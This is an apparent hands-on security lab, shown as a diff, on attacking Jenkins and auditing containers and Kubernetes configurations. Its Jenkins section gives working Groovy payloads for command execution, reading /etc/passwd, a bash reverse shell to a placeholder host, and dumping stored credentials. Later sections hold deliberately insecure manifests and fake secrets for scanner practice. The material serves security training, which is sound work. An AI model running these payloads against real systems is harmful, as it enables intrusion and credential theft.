@@ -1,0 +1,438 @@
+Auditing and Attacking Modern DevSecOps Systems
+Learning Objectives
+By the end of this lab, students will be able to:
+
+• Identify and exploit common Jenkins misconfigurations to gain unauthorized system access • Perform comprehensive secret scanning on container images and server filesystems • Conduct static security analysis of Kubernetes configurations using KubeLinter • Understand the security implications of misconfigured DevSecOps tools • Apply security best practices to prevent common DevSecOps vulnerabilities • Use open-source security tools to audit modern containerized environments
+
+Prerequisites
+Before starting this lab, students should have:
+
+• Basic understanding of Linux command line operations • Familiarity with Docker containers and basic containerization concepts • Basic knowledge of Kubernetes architecture and YAML configuration files • Understanding of CI/CD pipeline concepts • Basic networking knowledge (ports, services, HTTP requests) • Familiarity with text editors like nano or vim
+
+Lab Environment Setup
+Ready-to-Use Cloud Machines: Al Nafi provides pre-configured Linux-based cloud machines for this lab. Simply click Start Lab to access your dedicated environment. No need to build your own VM or install additional software - everything is ready to use!
+
+Your lab environment includes: • Ubuntu 20.04 LTS with all necessary tools pre-installed • Jenkins server running on port 8080 • Docker engine with sample vulnerable containers • Kubernetes cluster with misconfigured deployments • All required security scanning tools
+
+Task 1: Exploiting Jenkins Misconfigurations
+Subtask 1.1: Initial Jenkins Reconnaissance
+First, let's identify the Jenkins instance and gather information about its configuration.
+
+Check if Jenkins is running:
+sudo systemctl status jenkins
+Verify Jenkins is accessible:
+curl -I http://localhost:8080
+Check for anonymous access:
+curl -s http://localhost:8080/api/json | jq .
+If the command returns JSON data, anonymous access is enabled - this is a critical security misconfiguration.
+
+Subtask 1.2: Exploring Jenkins API Endpoints
+List all jobs without authentication:
+curl -s http://localhost:8080/api/json?tree=jobs[name,url] | jq '.jobs[]'
+Check for script console access:
+curl -s http://localhost:8080/script
+Enumerate users:
+curl -s http://localhost:8080/asynchPeople/api/json | jq '.users[].user.fullName'
+Subtask 1.3: Exploiting Script Console Access
+The Jenkins script console allows execution of Groovy scripts with system-level privileges.
+
+Access the script console via browser:
+
+Open your web browser
+Navigate to http://localhost:8080/script
+If accessible without authentication, this is a critical vulnerability
+Execute system commands via Groovy script:
+
+def command = "whoami"
+def process = command.execute()
+process.waitFor()
+println process.text
+Read sensitive files:
+def file = new File("/etc/passwd")
+if (file.exists()) {
+    println file.text
+}
+Create a reverse shell payload:
+def command = "bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'"
+command.execute()
+Subtask 1.4: Credential Harvesting
+Extract stored credentials:
+import jenkins.model.*
+import hudson.security.*
+import hudson.util.Secret
+
+def instance = Jenkins.getInstance()
+def credentialsStore = instance.getExtensionList('com.cloudbees.plugins.credentials.SystemCredentialsProvider')[0]
+
+if (credentialsStore != null) {
+    def credentials = credentialsStore.getCredentials()
+    credentials.each { cred ->
+        println "ID: ${cred.id}"
+        println "Description: ${cred.description}"
+        if (cred.hasProperty('username')) {
+            println "Username: ${cred.username}"
+        }
+        if (cred.hasProperty('password')) {
+            println "Password: ${Secret.toString(cred.password)}"
+        }
+        println "---"
+    }
+}
+Check build history for secrets:
+find /var/lib/jenkins/jobs -name "build.xml" -exec grep -l "password\|secret\|key" {} \;
+Task 2: Scanning for Secrets in Container Images and Servers
+Subtask 2.1: Installing and Configuring Secret Scanning Tools
+Install TruffleHog for secret detection:
+pip3 install truffleHog
+Install GitLeaks for Git repository scanning:
+wget https://github.com/zricethezav/gitleaks/releases/download/v8.18.0/gitleaks_8.18.0_linux_x64.tar.gz
+tar -xzf gitleaks_8.18.0_linux_x64.tar.gz
+sudo mv gitleaks /usr/local/bin/
+Install Docker Bench Security:
+git clone https://github.com/docker/docker-bench-security.git
+cd docker-bench-security
+Subtask 2.2: Scanning Container Images for Secrets
+List available Docker images:
+docker images
+Create a vulnerable container image for testing:
+mkdir vulnerable-app
+cd vulnerable-app
+
+cat > Dockerfile << 'EOF'
+FROM ubuntu:20.04
+RUN apt-get update && apt-get install -y curl
+COPY . /app
+WORKDIR /app
+ENV AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
+ENV AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+ENV DATABASE_PASSWORD=super_secret_password123
+EXPOSE 8080
+CMD ["echo", "Vulnerable app running"]
+EOF
+
+cat > config.json << 'EOF'
+{
+  "database": {
+    "host": "localhost",
+    "username": "admin",
+    "password": "admin123!@#",
+    "api_key": "sk-1234567890abcdef"
+  },
+  "github_token": "ghp_1234567890abcdefghijklmnopqrstuvwxyz"
+}
+EOF
+
+docker build -t vulnerable-app:latest .
+Scan the container image with TruffleHog:
+docker save vulnerable-app:latest | truffleHog --json
+Extract and scan container filesystem:
+docker create --name temp-container vulnerable-app:latest
+docker export temp-container > vulnerable-app.tar
+mkdir extracted-fs
+tar -xf vulnerable-app.tar -C extracted-fs/
+docker rm temp-container
+Scan extracted filesystem for secrets:
+truffleHog --json extracted-fs/
+Subtask 2.3: Scanning Server Filesystems
+Scan common locations for secrets:
+# Scan home directories
+find /home -name ".*" -type f 2>/dev/null | head -20 | xargs grep -l "password\|secret\|key\|token" 2>/dev/null
+
+# Scan configuration directories
+find /etc -name "*.conf" -o -name "*.cfg" -o -name "*.ini" 2>/dev/null | xargs grep -l "password\|secret\|key" 2>/dev/null
+
+# Scan log files
+find /var/log -name "*.log" 2>/dev/null | head -10 | xargs grep -i "password\|secret\|key\|token" 2>/dev/null
+Use GitLeaks to scan for secrets in Git repositories:
+# Create a test repository with secrets
+mkdir test-repo
+cd test-repo
+git init
+
+cat > app.py << 'EOF'
+import os
+
+# Bad practice - hardcoded secrets
+API_KEY = "sk-1234567890abcdefghijklmnopqrstuvwxyz"
+DATABASE_URL = "postgresql://user:password123@localhost:5432/mydb"
+AWS_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE"
+
+def connect_to_database():
+    password = "super_secret_password"
+    return f"Connecting with {password}"
+EOF
+
+git add .
+git commit -m "Initial commit with secrets"
+
+# Scan with GitLeaks
+gitleaks detect --source . --verbose
+Create custom secret detection rules:
+cat > custom-rules.toml << 'EOF'
+[[rules]]
+id = "custom-api-key"
+description = "Custom API Key"
+regex = '''sk-[a-zA-Z0-9]{32}'''
+
+[[rules]]
+id = "database-password"
+description = "Database Password"
+regex = '''password["\s]*[:=]["\s]*[a-zA-Z0-9!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]{8,}'''
+EOF
+
+gitleaks detect --source . --config custom-rules.toml
+Task 3: Static Analysis of Kubernetes Configurations using KubeLinter
+Subtask 3.1: Installing and Setting Up KubeLinter
+Install KubeLinter:
+wget https://github.com/stackrox/kube-linter/releases/download/0.6.8/kube-linter-linux.tar.gz
+tar -xzf kube-linter-linux.tar.gz
+sudo mv kube-linter /usr/local/bin/
+Verify installation:
+kube-linter version
+Subtask 3.2: Creating Vulnerable Kubernetes Configurations
+Create a directory for Kubernetes manifests:
+mkdir k8s-configs
+cd k8s-configs
+Create a vulnerable deployment manifest:
+cat > vulnerable-deployment.yaml << 'EOF'
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: vulnerable-app
+  labels:
+    app: vulnerable-app
+spec:
+  replicas: 3
+  selector:
+    matchLabels:
+      app: vulnerable-app
+  template:
+    metadata:
+      labels:
+        app: vulnerable-app
+    spec:
+      containers:
+      - name: app
+        image: nginx:latest
+        ports:
+        - containerPort: 80
+        env:
+        - name: DATABASE_PASSWORD
+          value: "plaintext-password"
+        - name: API_KEY
+          value: "sk-1234567890abcdef"
+        securityContext:
+          runAsUser: 0
+          privileged: true
+          allowPrivilegeEscalation: true
+        resources: {}
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: vulnerable-service
+spec:
+  selector:
+    app: vulnerable-app
+  ports:
+  - port: 80
+    targetPort: 80
+  type: LoadBalancer
+EOF
+Create a vulnerable pod with security issues:
+cat > vulnerable-pod.yaml << 'EOF'
+apiVersion: v1
+kind: Pod
+metadata:
+  name: insecure-pod
+spec:
+  hostNetwork: true
+  hostPID: true
+  hostIPC: true
+  containers:
+  - name: insecure-container
+    image: ubuntu:latest
+    command: ["/bin/sleep", "3600"]
+    securityContext:
+      privileged: true
+      runAsUser: 0
+      capabilities:
+        add:
+        - SYS_ADMIN
+        - NET_ADMIN
+    volumeMounts:
+    - name: host-root
+      mountPath: /host
+  volumes:
+  - name: host-root
+    hostPath:
+      path: /
+      type: Directory
+EOF
+Create a ConfigMap with sensitive data:
+cat > vulnerable-configmap.yaml << 'EOF'
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: app-config
+data:
+  database.properties: |
+    db.host=localhost
+    db.username=admin
+    db.password=admin123
+    api.key=sk-abcdef1234567890
+  app.conf: |
+    [database]
+    password = "super_secret_password"
+    [api]
+    token = "ghp_1234567890abcdefghijklmnop"
+EOF
+Subtask 3.3: Running KubeLinter Security Analysis
+Perform basic security scan:
+kube-linter lint k8s-configs/
+Run scan with detailed output:
+kube-linter lint --format json k8s-configs/ | jq .
+Check for specific security issues:
+# Check for privilege escalation
+kube-linter lint --include privilege-escalation-container k8s-configs/
+
+# Check for running as root
+kube-linter lint --include run-as-non-root k8s-configs/
+
+# Check for resource limits
+kube-linter lint --include no-resource-limits k8s-configs/
+Generate a comprehensive security report:
+kube-linter lint --format sarif k8s-configs/ > security-report.sarif
+Subtask 3.4: Analyzing and Interpreting Results
+Create a summary script to parse results:
+cat > analyze-results.sh << 'EOF'
+#!/bin/bash
+
+echo "=== KubeLinter Security Analysis Summary ==="
+echo
+
+# Count total issues
+TOTAL_ISSUES=$(kube-linter lint k8s-configs/ --format json | jq '.Reports | length')
+echo "Total Security Issues Found: $TOTAL_ISSUES"
+echo
+
+# Group by severity
+echo "Issues by Category:"
+kube-linter lint k8s-configs/ --format json | jq -r '.Reports[] | .Check' | sort | uniq -c | sort -nr
+
+echo
+echo "=== Detailed Issues ==="
+kube-linter lint k8s-configs/ --format json | jq -r '.Reports[] | "File: \(.Object.K8sObject.Name) | Check: \(.Check) | Message: \(.Message)"'
+EOF
+
+chmod +x analyze-results.sh
+./analyze-results.sh
+Fix identified security issues:
+cat > secure-deployment.yaml << 'EOF'
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: secure-app
+  labels:
+    app: secure-app
+spec:
+  replicas: 3
+  selector:
+    matchLabels:
+      app: secure-app
+  template:
+    metadata:
+      labels:
+        app: secure-app
+    spec:
+      containers:
+      - name: app
+        image: nginx:1.21.6  # Specific version instead of latest
+        ports:
+        - containerPort: 80
+        env:
+        - name: DATABASE_PASSWORD
+          valueFrom:
+            secretKeyRef:
+              name: app-secrets
+              key: database-password
+        securityContext:
+          runAsNonRoot: true
+          runAsUser: 1000
+          allowPrivilegeEscalation: false
+          readOnlyRootFilesystem: true
+          capabilities:
+            drop:
+            - ALL
+        resources:
+          limits:
+            cpu: 500m
+            memory: 512Mi
+          requests:
+            cpu: 250m
+            memory: 256Mi
+        livenessProbe:
+          httpGet:
+            path: /
+            port: 80
+          initialDelaySeconds: 30
+          periodSeconds: 10
+        readinessProbe:
+          httpGet:
+            path: /
+            port: 80
+          initialDelaySeconds: 5
+          periodSeconds: 5
+---
+apiVersion: v1
+kind: Secret
+metadata:
+  name: app-secrets
+type: Opaque
+data:
+  database-password: c3VwZXJfc2VjcmV0X3Bhc3N3b3Jk  # base64 encoded
+EOF
+Verify the fixes:
+kube-linter lint secure-deployment.yaml
+Troubleshooting Common Issues
+Jenkins Access Issues
+Problem: Cannot access Jenkins on port 8080
+Solution: Check if Jenkins service is running: sudo systemctl start jenkins
+Docker Permission Issues
+Problem: Permission denied when running Docker commands
+Solution: Add user to docker group: sudo usermod -aG docker $USER then logout and login
+KubeLinter Installation Issues
+Problem: KubeLinter binary not found
+Solution: Ensure the binary is in PATH: export PATH=$PATH:/usr/local/bin
+Secret Scanning False Positives
+Problem: Too many false positive results
+Solution: Use custom rules and filters to reduce noise
+Lab Validation and Testing
+Verify Jenkins exploitation:
+# Check if you can execute system commands
+curl -X POST http://localhost:8080/script -d "script=println('whoami'.execute().text)"
+Validate secret detection:
+# Ensure secrets are found in test files
+echo "API_KEY=sk-1234567890abcdef" > test-secret.txt
+truffleHog --json test-secret.txt
+Confirm Kubernetes analysis:
+# Verify KubeLinter finds security issues
+kube-linter lint k8s-configs/ | grep -c "found"
+Conclusion
+In this comprehensive lab, you have successfully:
+
+• Exploited Jenkins misconfigurations by identifying anonymous access vulnerabilities, accessing the script console, and extracting sensitive credentials - demonstrating how improper CI/CD security can lead to complete system compromise
+
+• Performed thorough secret scanning using multiple tools (TruffleHog, GitLeaks) to detect hardcoded credentials in container images, filesystems, and Git repositories - highlighting the critical importance of proper secret management
+
+• Conducted static security analysis of Kubernetes configurations using KubeLinter to identify privilege escalation risks, resource limit issues, and security context misconfigurations - showing how infrastructure-as-code requires security validation
+
+Why This Matters: Modern DevSecOps environments are complex ecosystems where a single misconfiguration can expose entire infrastructures. The techniques you've learned represent real-world attack vectors that malicious actors actively exploit. By understanding these vulnerabilities, you can:
+
+Implement proper security controls in CI/CD pipelines
+Establish secret management best practices
+Create secure Kubernetes deployment standards
+Perform regular security audits of DevSecOps toolchains
+Next Steps: Apply these skills in your own environments by regularly auditing Jenkins instances, implementing automated secret scanning in your CI/CD pipelines, and using tools like KubeLinter as part of your infrastructure security validation process.
+
+Remember: Security is not a one-time activity but an ongoing process that must be integrated into every aspect of the development and deployment lifecycle.
